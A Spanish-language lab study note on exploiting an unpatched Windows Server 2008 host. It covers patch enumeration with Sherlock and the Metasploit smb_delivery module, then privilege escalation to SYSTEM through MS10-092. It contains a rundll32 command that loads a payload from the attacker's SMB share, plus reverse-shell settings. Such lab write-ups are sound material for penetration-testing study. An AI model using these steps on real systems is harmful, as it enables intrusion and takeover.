
## Caso de estudio Server 2008

[Sherlock](https://github.com/rasta-mouse/Sherlock): script que busca parches faltantes
[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester): toma los resultados del comando `sysinfo` y compara el nivel de parches del host s con los de la base de datos de vulns de Microsoft

1. Consultar el nivel de parches actual

```
wmic qfe
```
![[Pasted image 20260914163239.png]]

2. Ejecutanod [Sherlock](https://github.com/rasta-mouse/Sherlock): 

```
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```
![[Pasted image 20260914163320.png]]

3. Obteniendo un shell meterpreter. A partir de la salida vemos varios parches faltantes. Podemos tratar de usar uno de los CVEs localizados, por ejemplo, smb_delivery:

```
search smb_delivery
use 0
show options
show targets
set target 0
exploit
```
![[Pasted image 20260914163455.png]]

4. Abrimos una cmd en el hots y ejecutamos rundll32 hacia el recurso SMB que ha creado MSF:

```
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

5. Recibimos la shell:

![[Pasted image 20260914163552.png]]

#### Escalada de privs local

1. Podemos buscar por el año del CVE ([MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930)):

```
search 2010-3338
use 0
```
![[Pasted image 20260914163702.png]]

2. Antes de usarlo debemos migrar nuestra sesion a un proceso de 64bits:

```
sessions -i 1
ps
migrate 2796
background
```
![[Pasted image 20260914163901.png]]

3. Configuramos el modulo del exploit de la escalada de privs:

```
set SESSION 1
set lhost 10.10.14.3
set lport 4443
show options
```
![[Pasted image 20260914163952.png]]

4. Recibimos una shell inversa elevada:

![[Pasted image 20260914164016.png]]![[Pasted image 20260914164023.png]]
